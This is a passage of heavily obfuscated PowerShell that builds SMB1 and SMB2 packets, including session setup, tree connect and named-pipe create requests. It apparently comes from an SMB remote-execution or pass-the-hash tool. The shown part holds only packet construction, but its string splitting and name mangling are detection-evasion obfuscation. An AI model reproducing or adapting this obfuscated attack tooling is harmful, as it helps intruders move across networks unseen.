    ${PAC`ke`T_s`MbREaDa`NdxreQuEst}.("{1}{0}" -f 'dd','A').Invoke(("{6}{8}{5}{0}{4}{7}{3}{2}{1}" -f'AndXReq','w','axCountLo','_M','ue','Read','SM','st','B'),[Byte[]](0x58,0x02))
    ${PA`CkET_`sM`Brea`D`AnDXR`E`QuEsT}.("{1}{0}" -f'dd','A').Invoke(("{0}{6}{1}{5}{4}{2}{3}"-f'S','R','nCo','unt','est_Mi','eadAndXRequ','MB'),[Byte[]](0x58,0x02))
    ${packEt_s`mBrEaD`A`Ndxr`EQue`ST}.("{1}{0}" -f 'dd','A').Invoke(("{4}{1}{3}{2}{0}"-f'Unknown','n','t_','dXReques','SMBReadA'),[Byte[]](0xff,0xff,0xff,0xff))
    ${p`AcKeT_sm`BREadAnDXRE`q`UEST}.("{0}{1}" -f'Ad','d').Invoke(("{2}{3}{1}{5}{0}{4}"-f 'in','BReadAndXRequest','S','M','ing','_Rema'),[Byte[]](0x00,0x00))
    ${PacKEt_sMBREaDAND`x`Re`q`U`e`St}.("{1}{0}" -f'dd','A').Invoke(("{7}{1}{5}{6}{0}{4}{2}{3}"-f'st','R','y','teCount','_B','eq','ue','SMBReadAndX'),[Byte[]](0x00,0x00))

    return ${P`AcKET_sMbrEadAndx`R`EQU`esT}
}

function geT-paCKeTsMb`WRiTE`AndxR`e`q`UEsT()
{
    param([Byte[]]${pAckE`T`_F`ile_iD},[Int]${p`Ac`keT_`R`Pc_`lENgth})

    [Byte[]]${pACk`Et_`Write_le`NgtH} =   ${8`14}::("{0}{2}{1}" -f'G','ytes','etB').Invoke(${Pack`eT_`Rp`C`_LENGth})
    ${pA`CK`Et_wrI`T`E_Le`NGtH} = ${PA`ck`Et_`w`RITE`_leNgth}[0,1]

    ${pAc`Ke`T_`Smb`Wr`ITE`AN`Dx`REQUeSt} = &("{1}{0}{2}" -f '-Ob','New','ject') ("{6}{7}{4}{5}{3}{9}{1}{8}{0}{2}"-f'tionar','edD','y','lized.Ord','ections.S','pecia','System','.Coll','ic','er')
    ${PAcKE`T`_S`m`BWRit`eANdxRE`quESt}.("{1}{0}"-f 'dd','A').Invoke(("{2}{5}{3}{1}{4}{0}" -f 'st_WordCount','eAndXRequ','S','t','e','MBWri'),[Byte[]](0x0e))
    ${PAcKEt_Smbw`RIt`e`A`ND`XrEQue`sT}.("{0}{1}"-f'A','dd').Invoke(("{5}{3}{8}{7}{0}{6}{1}{4}{2}" -f 'quest','dX','d','W','Comman','SMB','_An','e','riteAndXR'),[Byte[]](0xff))
    ${pACkET_sM`B`wRIt`eANdX`REquesT}.("{1}{0}" -f 'd','Ad').Invoke(("{5}{1}{4}{3}{0}{2}"-f 'serve','t','d','AndXRequest_Re','e','SMBWri'),[Byte[]](0x00))
    ${pACkEt_SMbW`R`itea`N`dX`R`EQU`Est}.("{1}{0}" -f 'd','Ad').Invoke(("{6}{0}{4}{1}{3}{2}{5}"-f 'AndX','uest_A','f','ndXOf','Req','set','SMBWrite'),[Byte[]](0x00,0x00))
    ${pAcKET_sm`BwRIT`ean`DXr`E`que`st}.("{1}{0}"-f 'd','Ad').Invoke(("{4}{5}{3}{1}{0}{2}{6}"-f 'u','Req','est_FI','X','SMBWri','teAnd','D'),${p`ACk`eT`_F`iLE_Id})
    ${Pa`CKEt_SM`B`w`R`I`TEandx`ReQUe`sT}.("{0}{1}"-f'A','dd').Invoke(("{2}{3}{4}{7}{5}{6}{1}{8}{0}"-f 't','f','SMB','Write','AndXRequ','_O','f','est','se'),[Byte[]](0xea,0x03,0x00,0x00))
    ${p`ACkET_smb`w`Ri`T`ean`dXREQueST}.("{1}{0}"-f 'dd','A').Invoke(("{2}{3}{7}{4}{1}{5}{6}{8}{0}"-f'd2','eAndXRequ','SMB','W','it','est','_Rese','r','rve'),[Byte[]](0xff,0xff,0xff,0xff))
    ${PAcKet`_sM`BWriTEAN`DXR`eq`UEst}.("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{4}{6}{8}{7}{3}{2}{5}"-f'SMBW','r','e','_Writ','iteAn','Mode','dX','quest','Re'),[Byte[]](0x08,0x00))
    ${pac`Ke`T`_s`mBW`RitEAnD`XRE`QUest}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{3}{7}{6}{2}{4}{5}{8}"-f'S','M','dXR','BWr','equest_','R','n','iteA','emaining'),${p`ACKeT_wri`T`E_LeNGTH})
    ${P`AcK`eT_sMb`wR`iTEAnDx`REQu`e`sT}.("{0}{1}" -f 'Ad','d').Invoke(("{8}{4}{1}{7}{2}{0}{6}{3}{9}{5}"-f'aLe','XRequest_','t','h','d','gh','ngt','Da','SMBWriteAn','Hi'),[Byte[]](0x00,0x00))
    ${pA`CK`et_sM`BwriteandXr`EqUeSt}.("{1}{0}" -f 'dd','A').Invoke(("{6}{0}{1}{3}{4}{2}{5}"-f 'BWriteA','nd','_DataLen','XRe','quest','gthLow','SM'),${P`ACk`e`T_W`R`Ite_LengtH})
    ${paCkET_Sm`Bwr`It`ean`DxReq`UesT}.("{1}{0}"-f'd','Ad').Invoke(("{6}{2}{4}{5}{1}{7}{3}{0}"-f'set','uest','MBWri','aOff','teA','ndXReq','S','_Dat'),[Byte[]](0x3f,0x00))
    ${pacK`Et_`SmB`wRi`TE`A`Nd`xREQuEsT}.("{1}{0}"-f'dd','A').Invoke(("{2}{0}{5}{1}{6}{3}{4}{7}"-f'Write','es','SMB','HighOff','s','AndXRequ','t_','et'),[Byte[]](0x00,0x00,0x00,0x00))
    ${P`A`CKEt`_SmBWRiTe`AndXrEQ`U`E`St}.("{1}{0}" -f 'd','Ad').Invoke(("{4}{6}{7}{5}{3}{0}{1}{2}"-f 'Req','uest_Byte','Count','X','SMB','nd','Wri','teA'),${paC`KE`T_writ`e_`lenGTh})

    return ${paC`k`et_smbWrit`EANd`X`RE`queST}
}

function GeT`-Pa`C`Ke`TsM`BCloSeRE`QUEst()
{
    param ([Byte[]]${pA`Ck`e`T_FILe_ID})

    ${Pa`CkET_sMB`cloS`e`ReQu`E`sT} = &("{2}{0}{1}"-f'Obj','ect','New-') ("{3}{1}{4}{2}{5}{0}{7}{6}{8}"-f 'd.','S','iz','System.Collections.','pecial','e','r','OrderedDictiona','y')
    ${p`AC`KEt_SMb`CloseR`eQUESt}.("{1}{0}"-f'd','Ad').Invoke(("{2}{3}{5}{0}{1}{4}"-f 'Request','_Wor','SM','B','dCount','Close'),[Byte[]](0x03))
    ${p`A`ckeT_s`m`BCLOSE`RE`QUest}.("{1}{0}" -f 'dd','A').Invoke(("{3}{2}{0}{1}"-f 's','t_FID','e','SMBCloseRequ'),${PACk`ET_fi`lE_id})
    ${PaC`k`eT`_smbC`lO`seRe`Quest}.("{0}{1}" -f 'Ad','d').Invoke(("{6}{4}{3}{5}{0}{2}{1}" -f 'ri','e','t','quest','Re','_LastW','SMBClose'),[Byte[]](0xff,0xff,0xff,0xff))
    ${PAc`KEt_`Smbc`Los`Ereque`ST}.("{1}{0}" -f'd','Ad').Invoke(("{1}{5}{2}{0}{6}{3}{4}" -f'equest_Byt','SM','seR','Co','unt','BClo','e'),[Byte[]](0x00,0x00))

    return ${paC`KET_smBC`L`O`sE`Req`Uest}
}

function g`Et-p`ACKetsM`BtrE`E`D`IsCOnnEctreQUe`st()
{
    ${Pa`C`kEt`_smBTreED`is`COnNe`Ctreq`U`EST} = &("{1}{2}{3}{0}" -f 'ject','N','e','w-Ob') ("{0}{5}{4}{7}{2}{9}{3}{8}{6}{1}"-f 'Sy','Dictionary','.Colle','pecia','t','s','ed','em','lized.Order','ctions.S')
    ${packE`T_`SmBtrE`edIscO`NNE`c`TREqu`eST}.("{1}{0}"-f'dd','A').Invoke(("{8}{6}{0}{2}{1}{5}{3}{4}{7}" -f'nnec','eques','tR','_','W','t','BTreeDisco','ordCount','SM'),[Byte[]](0x00))
    ${PaC`Ket_`S`mbTr`EEd`i`sc`onnECTrEQuesT}.("{0}{1}"-f'A','dd').Invoke(("{3}{5}{4}{1}{2}{6}{7}{0}" -f'nt','n','nectR','SMBTreeDis','o','c','equest_','ByteCou'),[Byte[]](0x00,0x00))

    return ${P`AcKeT_s`MbtREedis`ConNECT`Re`Qu`est}
}

function GET-`PA`ckeT`SMb`LoGOF`FaN`Dx`REquest()
{
    ${pAc`kEt_sM`BLogofF`AndX`REq`UE`ST} = &("{0}{1}{2}"-f'N','ew-Obj','ect') ("{0}{9}{3}{7}{2}{5}{1}{4}{6}{8}" -f 'System','eredDi','ial','C','ct','ized.Ord','i','ollections.Spec','onary','.')
    ${PaCKeT`_sM`Bl`o`gOFFA`NDx`REq`UEsT}.("{1}{0}" -f 'dd','A').Invoke(("{4}{0}{7}{1}{5}{6}{3}{2}"-f'offA','Req','t','WordCoun','SMBLog','u','est_','ndX'),[Byte[]](0x02))
    ${PAC`KeT_SMB`Lo`Gof`FaN`dxr`EquesT}.("{0}{1}"-f'A','dd').Invoke(("{6}{3}{2}{1}{0}{5}{7}{4}"-f'qu','XRe','fAnd','f','mand','est_AndXC','SMBLogo','om'),[Byte[]](0xff))
    ${paCKe`T_sm`Blo`GO`Ffan`dXReq`U`eST}.("{1}{0}" -f'dd','A').Invoke(("{6}{1}{7}{2}{5}{3}{4}{0}"-f'st_Reserved','BLogo','f','u','e','AndXReq','SM','f'),[Byte[]](0x00))
    ${paCkEt_SMbL`oG`Of`F`And`xR`EQUeST}.("{1}{0}" -f'd','Ad').Invoke(("{6}{2}{3}{1}{5}{4}{0}"-f 'Offset','XReque','of','fAnd','_AndX','st','SMBLog'),[Byte[]](0x00,0x00))
    ${PacKe`T_sM`BlO`G`OFFA`NDXrEQ`U`Est}.("{0}{1}"-f 'A','dd').Invoke(("{8}{0}{3}{6}{5}{1}{7}{4}{2}" -f 'MBLog','dXReques','ount','o','eC','An','ff','t_Byt','S'),[Byte[]](0x00,0x00))

    return ${P`A`cKet_`SmBLOg`oFF`AnD`X`REquEst}
}



function GET-PaCkE`Ts`mb`2HE`ADeR()
{
    param([Byte[]]${P`Ac`KET`_`COmMaND},[Int]${P`ACK`ET`_MESSAge`_ID},[Byte[]]${PaCK`Et_TR`E`e_Id},[Byte[]]${paCkEt_`SE`ss`iO`N_`id})

    [Byte[]]${PaCk`et_`m`E`SsaGe`_Id} =   ( &("{1}{2}{0}"-f'e','VArIAB','L')  ("81"+"4")  -VALue )::("{2}{1}{0}" -f 'ytes','etB','G').Invoke(${pA`ckE`T_`Me`SSaGe`_Id}) + 0x00,0x00,0x00,0x00

    ${PaCKE`T`_SMb2`HeADEr} = &("{2}{1}{0}"-f 'ject','ew-Ob','N') ("{2}{10}{3}{8}{7}{0}{6}{1}{4}{9}{5}" -f'.Spe','ialized.Ordere','Sy','tem.Colle','d','onary','c','tions','c','Dicti','s')
    ${PAc`kE`T_s`MB2HeAdER}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{4}{6}{5}{0}{3}{2}" -f '_P','SM','D','rotocolI','B2Hea','er','d'),[Byte[]](0xfe,0x53,0x4d,0x42))
    ${P`ACk`E`T_s`Mb2heADEr}.("{1}{0}"-f'dd','A').Invoke(("{0}{5}{4}{6}{3}{2}{1}" -f'S','Size','ure','ct','2Header_S','MB','tru'),[Byte[]](0x40,0x00))
    ${PACkE`T_smb2H`eaD`er}.("{1}{0}" -f'd','Ad').Invoke(("{3}{6}{2}{1}{0}{5}{4}"-f'_Cr','2Header','B','S','ditCharge','e','M'),[Byte[]](0x01,0x00))
    ${Pa`ckET_s`mb2`h`eADER}.("{0}{1}" -f 'Ad','d').Invoke(("{6}{0}{1}{2}{3}{5}{4}"-f 'B2','He','ader_Chann','elSeq','e','uenc','SM'),[Byte[]](0x00,0x00))
    ${PACKET_s`mb`2`hea`Der}.("{0}{1}"-f'A','dd').Invoke(("{4}{2}{3}{0}{1}"-f'Re','served','eade','r_','SMB2H'),[Byte[]](0x00,0x00))
    ${Pa`Ck`eT_sMb2H`EadER}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{2}{1}{0}{4}{5}" -f'C','er_','MB2Head','S','om','mand'),${P`A`CkEt_coM`manD})
    ${PA`ckET_`sM`B2`h`EAdER}.("{1}{0}"-f'dd','A').Invoke(("{3}{1}{4}{2}{0}"-f 't','Cre','ues','SMB2Header_','ditReq'),[Byte[]](0x00,0x00))
    ${P`AcKEt`_smb`2`HeADer}.("{1}{0}"-f 'dd','A').Invoke(("{1}{4}{0}{3}{2}"-f 'r_','SMB2Head','lags','F','e'),[Byte[]](0x00,0x00,0x00,0x00))
    ${P`ACKeT_SmB`2h`E`A`deR}.("{1}{0}"-f 'dd','A').Invoke(("{0}{2}{1}{3}{4}{5}" -f 'SMB2Hea','N','der_','ex','tComma','nd'),[Byte[]](0x00,0x00,0x00,0x00))
    ${P`A`C`kET_smB2`HeADeR}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{4}{0}{3}" -f'e','SMB2H','eader_','ssageID','M'),${p`A`CK`Et`_MessAgE_`iD})
    ${pack`e`T_`SMb2`hEAdER}.("{1}{0}" -f'dd','A').Invoke(("{4}{2}{0}{1}{5}{3}" -f '2','Header_Rese','MB','d2','S','rve'),[Byte[]](0x00,0x00,0x00,0x00))
    ${pACKet`_sMb`2HE`A`dEr}.("{1}{0}"-f 'd','Ad').Invoke(("{2}{0}{1}{3}" -f 'MB2Head','er_Tree','S','ID'),${pac`Ket_`T`R`Ee_ID})
    ${p`ACKEt`_SM`B2HEAder}.("{1}{0}" -f'd','Ad').Invoke(("{1}{2}{4}{0}{3}" -f'ssionI','SM','B2Hea','D','der_Se'),${P`A`cKet`_`Sessio`N_iD})
    ${PacKE`T_`S`MB2HEad`Er}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{3}{4}{2}{1}" -f'SMB','re','r_Signatu','2Hea','de'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return ${Pa`c`k`Et_smB2HEa`Der}
}

function GE`T`-PackETS`mB2neG`OtI`AT`ep`ROtocOLr`Equ`eSt()
{
    ${pAc`k`Et_sMB2nEgoT`I`ATEpr`OTO`cOl`R`EquesT} = &("{1}{0}{2}{3}" -f'Obje','New-','c','t') ("{7}{11}{5}{8}{12}{2}{4}{9}{0}{1}{3}{10}{6}"-f 'cial','ized.O','ns','rderedDiction','.','em.Coll','ry','Sys','ec','Spe','a','t','tio')
    ${pACket`_sMB2NEG`o`T`i`A`T`Ep`ROTocOl`RequE`st}.("{0}{1}" -f 'A','dd').Invoke(("{7}{8}{5}{6}{4}{1}{2}{3}{0}"-f 'reSize','ue','st_Str','uctu','q','R','e','SMB2NegotiatePro','tocol'),[Byte[]](0x24,0x00))
    ${PacKEt`_smb2NeGOt`IAte`PRoT`ocOLREqU`e`sT}.("{0}{1}" -f'A','dd').Invoke(("{7}{0}{2}{1}{6}{3}{5}{4}{8}" -f 'e','est_','gotiateProtocolRequ','e','oun','ctC','Dial','SMB2N','t'),[Byte[]](0x02,0x00))
    ${paCKE`T_sM`B2Neg`o`TIa`TEPrO`TO`CoL`R`E`QUesT}.("{0}{1}" -f'A','dd').Invoke(("{7}{5}{4}{6}{1}{2}{9}{3}{0}{8}" -f'Securit','c','olR','_','iate','MB2Negot','Proto','S','yMode','equest'),[Byte[]](0x01,0x00))
    ${PAck`eT_`sMb2n`egO`TiATepro`T`OC`OLreQUEst}.("{1}{0}" -f 'dd','A').Invoke(("{6}{1}{5}{3}{2}{0}{4}"-f'est_R','N','eProtocolRequ','otiat','eserved','eg','SMB2'),[Byte[]](0x00,0x00))
    ${p`ACKET_SM`B`2`NeGoTIAteproT`oColReQUEst}.("{0}{1}" -f'A','dd').Invoke(("{0}{8}{10}{7}{3}{9}{6}{5}{2}{1}{4}" -f'SMB2Ne','a','_Cap','P','bilities','est','Requ','ate','go','rotocol','ti'),[Byte[]](0x40,0x00,0x00,0x00))
    ${paCke`T`_S`mb2n`eg`OtIaTE`PR`oToCo`LreQ`Uest}.("{0}{1}"-f 'A','dd').Invoke(("{3}{6}{7}{5}{0}{1}{8}{9}{4}{2}"-f 'i','ateProt','lientGUID','SM','est_C','t','B','2Nego','o','colRequ'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${pAC`ket_s`mB2negoT`i`ATEPrOtOCOLrEq`U`esT}.("{1}{0}" -f'dd','A').Invoke(("{6}{5}{7}{4}{0}{1}{3}{8}{2}"-f 'ProtocolRequest_','Negoti','t','ateConte','te','Nego','SMB2','tia','xtOffse'),[Byte[]](0x00,0x00,0x00,0x00))
    ${pacKe`T`_S`mB`2`NegOTIA`Te`PrOtOcOlr`EqUest}.("{0}{1}" -f'A','dd').Invoke(("{12}{3}{2}{8}{5}{4}{9}{0}{6}{7}{11}{10}{1}"-f 'te','t','eProtocol','t','est_N','u','Co','nt','Req','egotia','xtCoun','e','SMB2Negotia'),[Byte[]](0x00,0x00))
    ${pa`c`keT_sm`B2NEgoT`IaTePROtoc`olREquEst}.("{0}{1}" -f 'Ad','d').Invoke(("{5}{2}{10}{6}{7}{3}{9}{1}{0}{11}{4}{8}"-f 'o','t','2','at','d','SMB','go','ti','2','ePro','Ne','colRequest_Reserve'),[Byte[]](0x00,0x00))
    ${PACKET_sm`B2Ne`GOt`i`ATEpROt`ocolrEQU`esT}.("{1}{0}"-f'dd','A').Invoke(("{1}{4}{5}{2}{6}{3}{0}" -f'equest_Dialect','SMB2Neg','P','otocolR','ot','iate','r'),[Byte[]](0x02,0x02))
    ${pACkET`_`sMb2N`egO`TiAtepRot`oCOlrEQueSt}.("{0}{1}" -f'Ad','d').Invoke(("{3}{0}{4}{1}{2}{5}{6}"-f 'B2Negotia','rotocolRequest_D','ia','SM','teP','lect','2'),[Byte[]](0x10,0x02))

    return ${PA`cKeT`_sM`B`2`NEGOti`AtePRoT`oColr`E`qUe`sT}
}

function gET`-Pa`ckETSMb`2`SEssi`oNsetU`pREQuest()
{
    param([Byte[]]${PACket`_seC`U`RITY_B`LOB})

    [Byte[]]${pAC`KET_`sECurIty`_blob_`LENGtH} =  (  &("{1}{2}{0}" -f 'IabLe','VA','r')  ('81'+'4')  ).vALUE::("{1}{2}{0}"-f'es','Get','Byt').Invoke(${pA`ck`Et_Secu`Rity_B`l`OB}."LeN`GtH")
    ${P`AcK`ET_`secU`RITY_BLOb`_Le`NgTh} = ${Pa`ck`ET_`Sec`URi`TY_BLOb_lEn`g`Th}[0,1]

    ${PaCKeT`_`sMB2`SessIons`e`Tu`prEQu`Est} = &("{0}{1}{2}"-f'New','-Obj','ect') ("{0}{5}{8}{7}{9}{3}{4}{1}{2}{6}"-f 'Sy','redDi','ctio','ons.Sp','ecialized.Orde','st','nary','.C','em','ollecti')
    ${PaCKEt_smb`2ses`Si`OnSetu`P`R`Eq`UesT}.("{0}{1}" -f 'Ad','d').Invoke(("{6}{0}{4}{1}{2}{5}{3}"-f'S','Reque','s','tructureSize','etup','t_S','SMB2Session'),[Byte[]](0x19,0x00))
    ${pACKe`T`_SMB`2s`e`S`s`IoN`SetupreQue`St}.("{0}{1}" -f'Ad','d').Invoke(("{2}{0}{3}{1}{5}{4}"-f 'es','i','SMB2S','s','SetupRequest_Flags','on'),[Byte[]](0x00))
    ${PacKET`_`smb`2SE`SS`IONS`Et`UPrEqUEST}.("{0}{1}" -f 'Ad','d').Invoke(("{7}{5}{4}{2}{6}{1}{3}{0}" -f'de','yM','Securi','o','ionSetupRequest_','Sess','t','SMB2'),[Byte[]](0x01))
    ${packeT_`SmB2SEssI`OnS`E`TUp`ReQu`Est}.("{0}{1}" -f 'A','dd').Invoke(("{3}{6}{5}{8}{9}{1}{0}{7}{2}{4}"-f'apab','C','li','SMB2Se','ties','SetupReq','ssion','i','u','est_'),[Byte[]](0x00,0x00,0x00,0x00))
    ${Pa`C`k`ET_smb2`sEsSIO`NSetUp`R`EQ`UEst}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{0}{7}{6}{5}{1}{3}{4}"-f '2','n','SMB','e','l','SetupRequest_Chan','n','Sessio'),[Byte[]](0x00,0x00,0x00,0x00))
    ${paCKe`T_S`Mb2sESsIONs`ET`Up`R`eQueSt}.("{1}{0}" -f 'dd','A').Invoke(("{7}{5}{8}{9}{10}{6}{0}{3}{4}{11}{2}{1}"-f 'tupRe','rOffset','Buffe','ques','t','Se','Se','SMB2','s','si','on','_Security'),[Byte[]](0x58,0x00))
    ${pacKet_smB2SES`SIoN`Set`UP`Re`qu`E`St}.("{0}{1}"-f'Ad','d').Invoke(("{1}{5}{0}{10}{8}{2}{9}{4}{3}{7}{11}{6}"-f'n','SMB2Ses','t_Secur','yB','t','sio','h','uffer','Reques','i','Setup','Lengt'),${PaCK`et_`s`ECU`RI`Ty_B`LOB_LEN`gTh})
    ${PacKE`T_smb2se`SS`iONsET`UP`Re`queST}.("{1}{0}"-f'd','Ad').Invoke(("{2}{4}{6}{5}{1}{3}{0}{7}"-f't_PreviousSess','etupReque','SMB2','s','Sessio','S','n','ionID'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${P`ACkeT`_SmB2`seSSI`O`N`SETuPRe`quE`St}.("{0}{1}" -f'Ad','d').Invoke(("{8}{6}{4}{3}{0}{1}{2}{7}{5}" -f 'Set','upRequ','es','n','o','Buffer','ssi','t_','SMB2Se'),${P`AcKE`T_Sec`Ur`ITY_Blob})

    return ${paCKet`_SMb2`SessIo`N`sETU`prE`q`U`ESt} 
}

function gE`T-pA`CKeT`s`Mb2t`RE`E`cONNECTR`EqUE`St()
{
    param([Byte[]]${pAc`K`eT_`PatH})

    [Byte[]]${PacKE`T_paTh`_`Le`NgTH} =  ${8`14}::("{1}{0}{2}"-f'etBy','G','tes').Invoke(${pa`Ck`eT_PaTH}."LEng`TH")
    ${p`ACK`E`T_paTH`_l`enGth} = ${pACkET`_pAtH_`le`N`g`Th}[0,1]

    ${Pac`KeT_s`M`B2t`ReeCOnN`eCTR`EQu`E`ST} = &("{2}{0}{1}{3}"-f'-Obje','c','New','t') ("{10}{12}{8}{2}{0}{11}{5}{7}{4}{3}{6}{9}{1}"-f 'n','tionary','o','e','.Order','ec','d','ialized','i','Dic','Sy','s.Sp','stem.Collect')
    ${PaCKeT_`Sm`B2t`R`EeCONN`EcT`ReQ`UE`ST}.("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{5}{8}{4}{3}{6}{0}{7}" -f 'z','reeConnectReq','SMB2T','tu','c','ues','reSi','e','t_Stru'),[Byte[]](0x09,0x00))
    ${PA`cKet_Smb2`TreE`conNe`ct`REQuESt}.("{1}{0}"-f'dd','A').Invoke(("{5}{7}{6}{3}{1}{0}{4}{2}"-f 's','e','ed','_R','erv','SMB2T','tRequest','reeConnec'),[Byte[]](0x00,0x00))
    ${paCKeT`_s`Mb2Tr`EEc`OnN`eCtrequEsT}.("{1}{0}" -f'dd','A').Invoke(("{0}{3}{4}{2}{5}{1}{7}{6}" -f 'SMB','eque','ect','2Tree','Conn','R','_PathOffset','st'),[Byte[]](0x48,0x00))
    ${PAc`KEt`_s`mB2tREeconnEctrE`QUeST}.("{1}{0}" -f 'd','Ad').Invoke(("{5}{0}{2}{4}{6}{1}{7}{3}"-f '2Tr','tReque','ee','ngth','Conn','SMB','ec','st_PathLe'),${PAc`KEt_pat`h_`lEng`Th})
    ${paCkEt_sM`B2TR`eECOnnECtRE`QU`e`ST}.("{1}{0}" -f'dd','A').Invoke(("{8}{7}{4}{6}{0}{5}{3}{2}{1}" -f'eeCon','r','_Buffe','ectRequest','B2','n','Tr','M','S'),${P`A`CKET_paTH})

    return ${pAckET_SmB2`Tr`EECO`Nn`ECTr`EQuEsT}
}

function G`ET`-`PacKe`T`sm`B2crea`TER`eQ`UEstFiLe()
{
    param([Byte[]]${PACK`Et_`N`AmEd`_`PIpe})

    ${PaCk`ET_N`AmED`_pip`E_`lENG`TH} =   (&("{1}{2}{0}"-f 'E','vaR','IaBL') ("8"+"14")  -VaL )::("{0}{1}" -f 'G','etBytes').Invoke(${Pa`Ck`E`T_naMeD_pIpe}."l`enG`Th")
    ${PAC`KET_nAMeD_P`ip`E_`Le`N`gtH} = ${PacK`E`T_n`Amed_Pi`Pe_lengtH}[0,1]

    ${PAckET`_sM`B2cReatE`REqu`E`ST`FIle} = &("{2}{0}{3}{1}"-f'b','ct','New-O','je') ("{1}{6}{3}{8}{9}{7}{5}{2}{0}{4}" -f'dDictio','S','e','ections.S','nary','rder','ystem.Coll','zed.O','p','eciali')
    ${PAcK`et`_sm`B`2creaTE`Req`U`EstFi`le}.("{1}{0}"-f 'd','Ad').Invoke(("{10}{7}{8}{9}{0}{4}{5}{6}{2}{1}{3}" -f'estFi','tur','truc','eSize','l','e','_S','2Creat','e','Requ','SMB'),[Byte[]](0x39,0x00))
    ${paCKEt`_sm`B2C`ReATERE`qUeStf`I`Le}.("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{2}{4}{0}"-f'uestFile_Flags','rea','teRe','SMB2C','q'),[Byte[]](0x00))
    ${p`AcKet_Smb2c`R`eaTER`EQUe`sT`FILE}.("{1}{0}" -f 'd','Ad').Invoke(("{5}{8}{2}{3}{12}{10}{7}{9}{4}{0}{1}{11}{6}" -f 'ckL','e','ea','teReque','o','SM','l','Op','B2Cr','l','ted','ve','stFile_Reques'),[Byte[]](0x00))
    ${PAcK`E`T_sMB2`CrE`ATErEQUe`s`Tf`ile}.("{1}{0}"-f'd','Ad').Invoke(("{2}{4}{6}{3}{7}{1}{5}{0}" -f 'ion','son','S','reateRequestFile_Impe','M','at','B2C','r'),[Byte[]](0x02,0x00,0x00,0x00))
    ${PaCkET`_S`mb2CREA`T`E`REQUestFi`LE}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{5}{3}{2}{4}"-f'SMB2Cr','eateReque','_','e','SMBCreateFlags','stFil'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${PACKeT_SMB2cREA`TE`Re`Q`UEs`TFi`LE}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{3}{0}{6}{5}{4}{7}{8}"-f 'ateRe','SMB','2Cr','e','_R','uestFile','q','ese','rved'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${pa`CKET_S`mb2CreatErE`QuE`st`FiLE}.("{1}{0}"-f'd','Ad').Invoke(("{4}{7}{0}{2}{8}{9}{5}{6}{3}{1}"-f 'Reque','ss','st','ce','S','edA','c','MB2Create','File_Des','ir'),[Byte[]](0x03,0x00,0x00,0x00))
    ${p`ACkeT_`sMB2`CReA`TEreq`UEst`Fi`le}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{2}{5}{9}{3}{6}{4}{1}{8}{7}"-f 'SMB2','t','C','ue','ile_FileA','reate','stF','ibutes','tr','Req'),[Byte[]](0x80,0x00,0x00,0x00))
    ${pack`ET_`S`MB`2cREatereQUe`sTfiLE}.("{0}{1}" -f 'A','dd').Invoke(("{4}{3}{6}{0}{1}{2}{5}" -f 'eRe','questFi','le_ShareA','Cre','SMB2','ccess','at'),[Byte[]](0x01,0x00,0x00,0x00))
    ${p`AcKEt_smb2c`R`e`A`TEre`qu`EsTFI`LE}.("{0}{1}"-f'A','dd').Invoke(("{8}{5}{4}{1}{2}{7}{3}{0}{6}" -f'sitio','es','t','spo','equ','ateR','n','File_CreateDi','SMB2Cre'),[Byte[]](0x01,0x00,0x00,0x00))
    ${pACkeT_`S`M`B2`C`REAt`ereqUEstFI`lE}.("{1}{0}"-f'd','Ad').Invoke(("{4}{2}{3}{6}{1}{5}{7}{0}" -f'teOptions','estFil','e','a','SMB2Cr','e_','teRequ','Crea'),[Byte[]](0x40,0x00,0x00,0x00))
    ${PA`CkET_sMB2CReA`T`Ere`Qu`eST`F`ILE}.("{1}{0}"-f'dd','A').Invoke(("{2}{5}{1}{0}{6}{4}{3}{7}"-f 'eque','eR','SMB2','ffs','meO','Creat','stFile_Na','et'),[Byte[]](0x78,0x00))
    ${pA`CkEt_sm`B2creaTEr`equE`sT`FI`LE}.("{0}{1}" -f'Ad','d').Invoke(("{5}{7}{1}{3}{6}{8}{4}{0}{9}{2}"-f'e','Crea','h','teR','le_Nam','S','eques','MB2','tFi','Lengt'),${PAcKEt_naM`ED_p`I`Pe`_lENGTH})
    ${p`ACke`T`_sm`B2cr`eATERequ`eStFiLE}.("{0}{1}"-f'A','dd').Invoke(("{7}{6}{1}{5}{2}{0}{3}{4}" -f 'ContextsOffs','CreateRequestFile','reate','e','t','_C','B2','SM'),[Byte[]](0x00,0x00,0x00,0x00))
    ${packet_smb2creAtEreq`UEs`Tf`i`LE}.("{1}{0}"-f'd','Ad').Invoke(("{5}{8}{2}{11}{0}{6}{1}{3}{4}{10}{9}{7}" -f'eRe','uestF','rea','il','e_Cr','SM','q','gth','B2C','n','eateContextsLe','t'),[Byte[]](0x00,0x00,0x00,0x00))
    ${p`A`CKeT`_SMb2CR`e`ATeR`EQuEsTF`ile}.("{1}{0}"-f'd','Ad').Invoke(("{4}{2}{1}{6}{5}{3}{0}" -f 'r','questF','reateRe','uffe','SMB2C','_B','ile'),${p`A`cKe`T_nAmED`_pIpe})

    return ${Pa`c`ket_s`m`B2creATE`ReQu`EsTFIlE}
}

function gET-pA`cKeT`s`mB`2reaDrEquE`St()
{
    param ([Byte[]]${Pac`kET`_`F`Ile_ID})

